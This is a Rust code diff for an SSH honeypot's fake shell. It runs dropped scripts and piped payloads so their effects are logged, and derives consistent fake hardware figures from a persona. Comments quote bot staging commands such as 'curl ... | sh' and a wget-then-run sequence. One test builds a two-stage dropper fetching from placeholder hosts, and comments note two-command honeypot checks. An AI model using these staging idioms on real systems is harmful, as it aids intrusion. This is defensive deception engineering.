@@ -133,38 +133,61 @@ pub fn hostname(shell: &Shell, _args: &[String]) -> CommandResult {
 }
 
 /// `nproc` — matches the single-core `/proc/cpuinfo` snapshot.
-pub fn nproc(_shell: &Shell, _args: &[String]) -> CommandResult {
-    CommandResult::ok("1\n")
+pub fn nproc(shell: &Shell, _args: &[String]) -> CommandResult {
+    CommandResult::ok(format!("{}\n", shell.persona.cpu_cores))
 }
 
-/// `lscpu` — describes the same single-core Xeon presented by `/proc/cpuinfo`.
-pub fn lscpu(_shell: &Shell, _args: &[String]) -> CommandResult {
-    CommandResult::ok(
+/// `lscpu` — describes the same CPU `/proc/cpuinfo` and `nproc` report, drawn
+/// from the deployment persona so the three cannot drift apart.
+pub fn lscpu(shell: &Shell, _args: &[String]) -> CommandResult {
+    let p = &shell.persona;
+    let cpu = &p.cpu;
+    let online = if p.cpu_cores == 1 {
+        "0".to_string()
+    } else {
+        format!("0-{}", p.cpu_cores - 1)
+    };
+    CommandResult::ok(format!(
         "Architecture:             x86_64\n\
          CPU op-mode(s):           32-bit, 64-bit\n\
          Byte Order:               Little Endian\n\
-         CPU(s):                   1\n\
-         On-line CPU(s) list:      0\n\
-         Vendor ID:                GenuineIntel\n\
-         Model name:               Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz\n\
-         CPU family:               6\n\
-         Model:                    85\n\
+         CPU(s):                   {cores}\n\
+         On-line CPU(s) list:      {online}\n\
+         Vendor ID:                {vendor}\n\
+         Model name:               {name}\n\
+         CPU family:               {family}\n\
+         Model:                    {model}\n\
          Thread(s) per core:       1\n\
-         Core(s) per socket:       1\n\
+         Core(s) per socket:       {cores}\n\
          Socket(s):                1\n\
-         Stepping:                 7\n\
-         BogoMIPS:                 5000.00\n\
+         Stepping:                 {stepping}\n\
+         BogoMIPS:                 {bogomips}\n\
          Hypervisor vendor:        KVM\n\
          Virtualization type:      full\n",
-    )
+        cores = p.cpu_cores,
+        online = online,
+        vendor = cpu.vendor,
+        name = cpu.name,
+        family = cpu.family,
+        model = cpu.model,
+        stepping = cpu.stepping,
+        bogomips = p.bogomips(),
+    ))
 }
 
 /// `bash`/`sh` — the shell this session already claims to be.
 ///
-/// `-c LINE` runs the line, which is how bot payloads usually arrive
-/// (`sh -c "cd /tmp; wget ...; ./x"`). Without `-c` a real shell would start an
-/// interactive subshell: since the emulated prompt is identical either way,
-/// returning immediately is indistinguishable to the attacker.
+/// Three ways a payload arrives, all of which now run:
+///
+/// - `-c LINE`, the classic `sh -c "cd /tmp; wget ...; ./x"`;
+/// - piped stdin, which is what `... | base64 -d | sh` and `curl ... | sh`
+///   produce — the single most common staging idiom there is;
+/// - a script operand, read back out of the VFS, which is what the
+///   `wget`-then-`chmod +x`-then-run sequence ends in.
+///
+/// Each line of a script or of stdin is run through the same shell that would
+/// have run it interactively, so the nesting cap and the output cap apply
+/// exactly as they do everywhere else.
 pub fn shell_cmd(shell: &mut Shell, args: &[String]) -> CommandResult {
     let mut iter = args.iter();
     while let Some(arg) = iter.next() {
@@ -181,13 +204,151 @@ pub fn shell_cmd(shell: &mut Shell, args: &[String]) -> CommandResult {
             }
             // Interactive/login flags change nothing here.
             "-i" | "-l" | "-s" | "--login" | "-" => {}
-            // ponytail: a script operand runs nothing (an empty script is the
-            // honest reading of a VFS file with no executable semantics);
-            // upgrade when the VFS can actually interpret file contents.
-            _ => return CommandResult::ok(""),
+            other if other.starts_with('-') => {}
+            // A script operand: read it out of the VFS and run it.
+            other => {
+                let Some(id) = shell.vfs.resolve(shell.cwd, other) else {
+                    return CommandResult::err(
+                        format!("bash: {other}: No such file or directory\n"),
+                        127,
+                    );
+                };
+                let text = match &shell.vfs.node(id).kind {
+                    crate::vfs::NodeKind::File { contents } => {
+                        String::from_utf8_lossy(contents).into_owned()
+                    }
+                    _ => {
+                        return CommandResult::err(format!("bash: {other}: Is a directory\n"), 126)
+                    }
+                };
+                return run_script(shell, &text);
+            }
         }
     }
-    CommandResult::ok("")
+
+    // No `-c` and no operand: a real shell reads its stdin. Over a pipe that is
+    // the payload; with no pipe there is nothing to read and it exits.
+    match shell.stdin.clone() {
+        Some(text) if !text.trim().is_empty() => run_script(shell, &text),
+        _ => CommandResult::ok(""),
+    }
+}
+
+/// How many lines of a script or of piped stdin `sh` will run.
+///
+/// The output cap alone does not bound this: a script of a million `true` lines
+/// produces nothing to truncate and still costs a parse per line. A VFS file
+/// can hold 8 MiB, so without a line cap an attacker buys arbitrary CPU for one
+/// upload.
+const MAX_SCRIPT_LINES: usize = 4096;
+
+/// Run each line of `text` as a shell command, accumulating both streams.
+///
+/// This is what makes a dropped script observable: the download was already
+/// captured, but until the body actually ran, nothing downstream of it — the
+/// second-stage fetch, the persistence attempt, the credential change — was
+/// ever seen.
+fn run_script(shell: &mut Shell, text: &str) -> CommandResult {
+    let mut out = String::new();
+    let mut errs = String::new();
+    let mut status = 0;
+    // `Shell::execute` clears `captures` on entry, so each line would otherwise
+    // wipe the one before it — a script that fetched two payloads would log
+    // only the second. Accumulate across the whole body and hand the lot back,
+    // the way command substitution already does for its subshell.
+    let mut collected = std::mem::take(&mut shell.captures);
+
+    for line in text.lines().take(MAX_SCRIPT_LINES) {
+        let line = line.trim();
+        // Shebangs and comments are not commands.
+        if line.is_empty() || line.starts_with('#') {
+            continue;
+        }
+        let result = shell.execute(line);
+        // The network layer logs a `command` event per line the *client*
+        // submits, and these lines came from a file. Capturing each one is what
+        // makes a dropped script observable rather than just its side effects.
+        collected.push(crate::shell::Capture::ScriptCommand {
+            line: line.to_string(),
+            status: result.status,
+        });
+        collected.append(&mut shell.captures);
+        // `stdout` is the pipe view and `text` the terminal-combined one; a
+        // script's output is going onward as a stream, so only the former.
+        out.push_str(&result.stdout);
+        errs.push_str(&result.stderr);
+        status = result.status;
+        if result.exit {
+            break;
+        }
+        // Bounded like every other accumulated stream.
+        if out.len() + errs.len() > super::MAX_COMMAND_OUTPUT_BYTES {
+            break;
+        }
+    }
+    shell.captures = collected;
+    CommandResult::streams(out, errs, status)
+}
+
+/// `printf FORMAT [ARG]...`
+///
+/// Scripts reach for `printf` wherever `echo`'s portability is in doubt, which
+/// in practice means anywhere a payload builds a multi-line file.
+pub fn printf(_shell: &Shell, args: &[String]) -> CommandResult {
+    let Some(format) = args.first() else {
+        return CommandResult::err("printf: usage: printf [-v var] format [arguments]\n", 2);
+    };
+    let mut operands = args[1..].iter();
+    let mut out = String::new();
+    let chars: Vec<char> = format.chars().collect();
+    let mut i = 0;
+
+    while i < chars.len() {
+        match chars[i] {
+            '\\' if i + 1 < chars.len() => {
+                match chars[i + 1] {
+                    'n' => out.push('\n'),
+                    't' => out.push('\t'),
+                    'r' => out.push('\r'),
+                    '0' => out.push('\0'),
+                    '\\' => out.push('\\'),
+                    // An unknown escape is passed through as written, the way
+                    // bash's printf does rather than swallowing the backslash.
+                    other => {
+                        out.push('\\');
+                        out.push(other);
+                    }
+                }
+                i += 2;
+            }
+            '%' if i + 1 < chars.len() => {
+                match chars[i + 1] {
+                    '%' => out.push('%'),
+                    's' => out.push_str(operands.next().map(String::as_str).unwrap_or("")),
+                    'd' | 'i' => {
+                        let v: i64 = operands
+                            .next()
+                            .and_then(|a| a.trim().parse().ok())
+                            .unwrap_or(0);
+                        out.push_str(&v.to_string());
+                    }
+                    other => {
+                        out.push('%');
+                        out.push(other);
+                    }
+                }
+                i += 2;
+            }
+            c => {
+                out.push(c);
+                i += 1;
+            }
+        }
+        if out.len() > super::MAX_COMMAND_OUTPUT_BYTES {
+            break;
+        }
+    }
+    CommandResult::ok(out)
 }
 
 /// `scp` run as an interactive command.
@@ -663,6 +824,41 @@ fn invocation(name: &str, args: &[String]) -> String {
 /// Build the full table including this session's own login chain. `running` is
 /// the command asking for the table: it is itself in the process list it
 /// prints, so `top` must not report `ps aux` as the process at the top.
+/// The `(pid, command)` pairs the fabricated process table holds.
+///
+/// `pidof`, `pgrep` and `killall` all read this, so none of them can disagree
+/// with what `ps` prints — three commands inventing their own tables would
+/// contradict each other on the first cross-check.
+pub fn process_table(shell: &Shell) -> Vec<(u32, String)> {
+    session_table(shell, "ps")
+        .into_iter()
+        .map(|p| (p.pid, p.cmd))
+        .collect()
+}
+
+/// The executable name a `ps` command line reports, the way `/proc/PID/comm`
+/// would: the first word, minus any directory, minus the `sshd: ` title prefix
+/// a privilege-separated daemon rewrites its argv to, minus the brackets a
+/// kernel thread is shown in.
+///
+/// Without this, `pidof sshd` misses the one process an attacker is guaranteed
+/// to look for — `ps` prints `sshd: /usr/sbin/sshd -D [listener]`, whose first
+/// word is `sshd:`.
+pub fn process_name(cmd: &str) -> &str {
+    let first = cmd.split_whitespace().next().unwrap_or(cmd);
+    let first = first.strip_suffix(':').unwrap_or(first);
+    let first = first.rsplit('/').next().unwrap_or(first);
+    first.trim_start_matches('[').trim_end_matches(']')
+}
+
+/// The pid of the first process whose executable name is `name`, if any.
+pub fn process_pid(shell: &Shell, name: &str) -> Option<u32> {
+    process_table(shell)
+        .into_iter()
+        .find(|(_, cmd)| process_name(cmd) == name)
+        .map(|(pid, _)| pid)
+}
+
 fn session_table(shell: &Shell, running: &str) -> Vec<Proc> {
     let mut table = base_table();
     let user = shell.username.clone();
@@ -976,7 +1172,7 @@ pub fn pkill(shell: &Shell, args: &[String]) -> CommandResult {
 }
 
 /// `free [-h|-m|-g]`
-pub fn free(_shell: &Shell, args: &[String]) -> CommandResult {
+pub fn free(shell: &Shell, args: &[String]) -> CommandResult {
     let human = args.iter().any(|a| a == "-h" || a == "--human");
     let mega = args.iter().any(|a| a == "-m");
     let giga = args.iter().any(|a| a == "-g");
@@ -987,8 +1183,16 @@ pub fn free(_shell: &Shell, args: &[String]) -> CommandResult {
     // check in one command.
     // buff/cache = Buffers + Cached + SReclaimable, and used is whatever is
     // left, exactly as procps derives them from `/proc/meminfo`.
-    let (total, used, free_mem, shared, buff, available) =
-        (2041208u64, 183336, 1503544, 992, 354328, 1764920);
+    // Derived from the persona's `MemTotal` with the same proportions
+    // `/proc/meminfo` uses, so the two agree for any deployment.
+    let total = shell.persona.mem_total_kb;
+    let free_mem = total * 73 / 100;
+    let available = total * 86 / 100;
+    let shared = 992u64;
+    // buff/cache = Buffers + Cached + SReclaimable.
+    let buff = total * 13 / 1000 + total * 139 / 1000 + total * 20 / 1000;
+    // used is whatever is left, so the row balances by construction.
+    let used = total.saturating_sub(free_mem).saturating_sub(buff);
 
     let fmt = |kb: u64| -> String {
         if human {
@@ -1103,7 +1307,8 @@ fn binary_path(name: &str) -> Option<String> {
         return None;
     }
     let dir = match name {
-        "ip" | "ss" => "/usr/sbin",
+        "addgroup" | "adduser" | "chpasswd" | "deluser" | "groupadd" | "ip" | "nologin"
+        | "service" | "ss" | "useradd" | "userdel" => "/usr/sbin",
         _ => "/usr/bin",
     };
     Some(format!("{dir}/{name}"))
@@ -1150,28 +1355,59 @@ pub fn last(shell: &Shell, _args: &[String]) -> CommandResult {
 }
 
 /// `df [-h]`
-pub fn df(_shell: &Shell, args: &[String]) -> CommandResult {
+pub fn df(shell: &Shell, args: &[String]) -> CommandResult {
     let human = args.iter().any(|a| a == "-h" || a == "--human-readable");
-    // Every tmpfs size here is derivable from `MemTotal` (2041208 kB) the way
-    // the kernel and systemd size them — devtmpfs and /dev/shm at half of RAM,
+    // Every tmpfs size is derived from the persona's `MemTotal` the way the
+    // kernel and systemd size them — devtmpfs and /dev/shm at half of RAM,
     // /run and /run/user/<uid> at a tenth. A `df` implying more RAM than
     // `free` reports is a two-command honeypot check.
+    let mem = shell.persona.mem_total_kb;
+    let disk = shell.persona.disk_total_kb;
+    let udev = mem / 2 - 5270;
+    let run = mem / 10;
+    let shm = mem / 2;
+    let used = disk * 16 / 100;
+    let avail = disk - used - (disk / 20);
+    let pct = (used * 100).div_ceil(disk.max(1));
+    let uid = shell.uid;
+
     let out = if human {
-        "Filesystem      Size  Used Avail Use% Mounted on\n\
-         udev            992M     0  992M   0% /dev\n\
-         tmpfs           200M  960K  199M   1% /run\n\
-         /dev/sda1        40G  6.3G   31G  17% /\n\
-         tmpfs           997M     0  997M   0% /dev/shm\n\
-         tmpfs           5.0M     0  5.0M   0% /run/lock\n\
-         tmpfs           200M     0  200M   0% /run/user/0\n"
+        format!(
+            "Filesystem      Size  Used Avail Use% Mounted on\n\
+             udev            {udev:>4}     0  {udev:>4}   0% /dev\n\
+             tmpfs           {run:>4}  960K  {run:>4}   1% /run\n\
+             /dev/sda1       {disk:>4}  {used:>4}  {avail:>4}  {pct}% /\n\
+             tmpfs           {shm:>4}     0  {shm:>4}   0% /dev/shm\n\
+             tmpfs           5.0M     0  5.0M   0% /run/lock\n\
+             tmpfs           {run:>4}     0  {run:>4}   0% /run/user/{uid}\n",
+            udev = human_kib(udev),
+            run = human_kib(run),
+            shm = human_kib(shm),
+            disk = human_kib(disk),
+            used = human_kib(used),
+            avail = human_kib(avail),
+            pct = pct,
+            uid = uid,
+        )
     } else {
-        "Filesystem     1K-blocks    Used Available Use% Mounted on\n\
-         udev             1015532       0   1015532   0% /dev\n\
-         tmpfs             204120     960    203160   1% /run\n\
-         /dev/sda1       41019672 6552432  32352140  17% /\n\
-         tmpfs            1020604       0   1020604   0% /dev/shm\n\
-         tmpfs               5120       0      5120   0% /run/lock\n\
-         tmpfs             204116       0    204116   0% /run/user/0\n"
+        format!(
+            "Filesystem     1K-blocks    Used Available Use% Mounted on\n\
+             udev          {udev:>10}       0  {udev:>8}   0% /dev\n\
+             tmpfs         {run:>10}     960  {run_avail:>8}   1% /run\n\
+             /dev/sda1     {disk:>10} {used:>7}  {avail:>8}  {pct}% /\n\
+             tmpfs         {shm:>10}       0  {shm:>8}   0% /dev/shm\n\
+             tmpfs               5120       0      5120   0% /run/lock\n\
+             tmpfs         {run:>10}       0  {run:>8}   0% /run/user/{uid}\n",
+            udev = udev,
+            run = run,
+            run_avail = run - 960,
+            disk = disk,
+            used = used,
+            avail = avail,
+            pct = pct,
+            shm = shm,
+            uid = uid,
+        )
     };
     CommandResult::ok(out)
 }
@@ -1352,6 +1588,110 @@ mod tests {
 
     fn run(shell: &mut Shell, line: &str) -> String {
         shell.execute(line).text
+    }
+
+    /// The whole point of running a dropped script: the download was already
+    /// captured, but nothing downstream of it was observable until the body
+    /// actually ran.
+    #[test]
+    fn a_dropped_script_runs_its_body() {
+        let mut shell = Shell::new("root", "debian");
+        run(&mut shell, "mkdir -p /tmp/.x");
+        shell.execute("printf '#!/bin/sh\\nid\\nwhoami\\n' > /tmp/.x/p.sh");
+        let out = shell.execute("sh /tmp/.x/p.sh");
+        assert!(out.stdout.contains("uid=0(root)"), "{:?}", out.stdout);
+        assert!(out.stdout.contains("root\n"), "{:?}", out.stdout);
+        // A missing script fails the way a real shell reports it.
+        let missing = shell.execute("sh /tmp/nope.sh");
+        assert_eq!(missing.status, 127);
+    }
+
+    /// A `command` event is emitted per line the *client* submits, so without a
+    /// capture per script line the log would show `sh /tmp/p.sh` and nothing of
+    /// what it did — which is exactly the intelligence running the body exists
+    /// to recover.
+    #[test]
+    fn a_dropped_script_reports_each_line_it_ran() {
+        use crate::shell::Capture;
+        let mut shell = Shell::new("root", "debian");
+        shell.execute("printf '#!/bin/sh\\nid\\nnosuchcmd\\n' > /tmp/p.sh");
+        shell.captures.clear();
+        shell.execute("sh /tmp/p.sh");
+
+        let lines: Vec<(String, i32)> = shell
+            .captures
+            .iter()
+            .filter_map(|c| match c {
+                Capture::ScriptCommand { line, status } => Some((line.clone(), *status)),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            lines,
+            vec![("id".to_string(), 0), ("nosuchcmd".to_string(), 127)],
+            "the shebang is not a command; the 127 is the field that names what \
+             to emulate next"
+        );
+    }
+
+    /// `Shell::execute` clears captures on entry, so a script's lines would
+    /// overwrite each other's side effects — the second fetch of a two-stage
+    /// dropper is exactly the one an analyst needs.
+    #[test]
+    fn a_script_keeps_every_line_s_captures() {
+        use crate::shell::Capture;
+        let mut shell = Shell::new("root", "debian");
+        shell.execute(
+            "printf 'wget http://a.example/one\\nwget http://b.example/two\\n' > /tmp/two.sh",
+        );
+        shell.captures.clear();
+        shell.execute("sh /tmp/two.sh");
+
+        let urls: Vec<String> = shell
+            .captures
+            .iter()
+            .filter_map(|c| match c {
+                Capture::Download { url, .. } => Some(url.clone()),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            urls,
+            vec![
+                "http://a.example/one".to_string(),
+                "http://b.example/two".to_string()
+            ],
+            "a line's captures were overwritten by the next line's"
+        );
+    }
+
+    /// A script that runs itself is the obvious way to turn one upload into an
+    /// unbounded stack. `dispatch`'s nesting cap has to catch it, because a
+    /// stack overflow aborts the whole process rather than one session.
+    #[test]
+    fn a_self_running_script_hits_the_nesting_cap() {
+        let mut shell = Shell::new("root", "debian");
+        shell.execute("echo 'sh /tmp/loop.sh' > /tmp/loop.sh");
+        let out = shell.execute("sh /tmp/loop.sh");
+        assert!(
+            out.stderr.contains("Resource temporarily unavailable"),
+            "recursion was not bounded: {:?}",
+            out.stderr
+        );
+    }
+
+    /// A script's line count is not bounded by the output cap: a million `true`
+    /// lines produce nothing to truncate and still cost a parse each.
+    #[test]
+    fn a_script_runs_at_most_the_line_cap() {
+        let mut shell = Shell::new("root", "debian");
+        let body = "echo x\n".repeat(super::MAX_SCRIPT_LINES + 500);
+        let out = shell.execute(&format!("printf '%s' '{body}' | sh"));
+        assert_eq!(
+            out.stdout.matches('x').count(),
+            super::MAX_SCRIPT_LINES,
+            "line cap not applied"
+        );
     }
 
     #[test]
@@ -1589,11 +1929,73 @@ mod tests {
         assert!(run(&mut shell, "top -b").contains("Tasks:"));
         assert!(run(&mut shell, "free").contains("Mem:"));
         // procps' scaling: a decimal place only below 10, so `1.9Gi` but
-        // `346Mi` — never `346.0Mi`.
+        // `346Mi` — never `346.0Mi`. Asserted as the rule rather than against
+        // pinned figures, because the numbers now come from the deployment
+        // persona and differ per sensor by design.
         let human = run(&mut shell, "free -h");
-        assert!(human.contains("1.9Gi"), "unexpected `free -h`: {human}");
-        assert!(human.contains("346Mi"), "unexpected `free -h`: {human}");
         assert!(!human.contains(".0Mi"), "unexpected `free -h`: {human}");
+        assert!(!human.contains(".0Gi"), "unexpected `free -h`: {human}");
+        assert!(human.contains("Gi") || human.contains("Mi"), "{human}");
+    }
+
+    /// Whatever RAM a deployment claims, every command that reports it must
+    /// report the same figure. `free` disagreeing with `/proc/meminfo` is a
+    /// two-command honeypot check, and the persona exists to make the two
+    /// impossible to set independently.
+    #[test]
+    fn memory_figures_agree_across_commands_for_every_persona() {
+        for seed in 0..16u64 {
+            let persona = crate::persona::Persona::from_seed(seed);
+            let total = persona.mem_total_kb;
+            let mut shell = Shell::with_persona("root", "debian", persona);
+
+            let meminfo = run(&mut shell, "cat /proc/meminfo");
+            assert!(
+                meminfo.contains(&format!("MemTotal:        {total} kB")),
+                "seed={seed} meminfo={meminfo}"
+            );
+
+            // `free` prints kB totals in its first column.
+            let free_out = run(&mut shell, "free");
+            let mem_line = free_out
+                .lines()
+                .find(|l| l.starts_with("Mem:"))
+                .expect("a Mem: row");
+            let reported: u64 = mem_line
+                .split_whitespace()
+                .nth(1)
+                .and_then(|v| v.parse().ok())
+                .expect("a total column");
+            assert_eq!(reported, total, "seed={seed}: free disagrees with meminfo");
+        }
+    }
+
+    /// The same, for the CPU: `nproc`, `lscpu` and `/proc/cpuinfo` all read the
+    /// persona, so none of them can name a processor the others do not.
+    #[test]
+    fn cpu_figures_agree_across_commands_for_every_persona() {
+        for seed in 0..16u64 {
+            let persona = crate::persona::Persona::from_seed(seed);
+            let (cores, name) = (persona.cpu_cores, persona.cpu.name);
+            let mut shell = Shell::with_persona("root", "debian", persona);
+
+            assert_eq!(run(&mut shell, "nproc").trim(), cores.to_string());
+
+            let lscpu_out = run(&mut shell, "lscpu");
+            assert!(lscpu_out.contains(name), "seed={seed}: {lscpu_out}");
+            assert!(
+                lscpu_out.contains(&format!("CPU(s):                   {cores}")),
+                "seed={seed}: {lscpu_out}"
+            );
+
+            let cpuinfo = run(&mut shell, "cat /proc/cpuinfo");
+            assert!(cpuinfo.contains(name), "seed={seed}");
+            assert_eq!(
+                cpuinfo.matches("processor\t: ").count(),
+                cores as usize,
+                "seed={seed}: one cpuinfo block per core"
+            );
+        }
     }
 
     #[test]
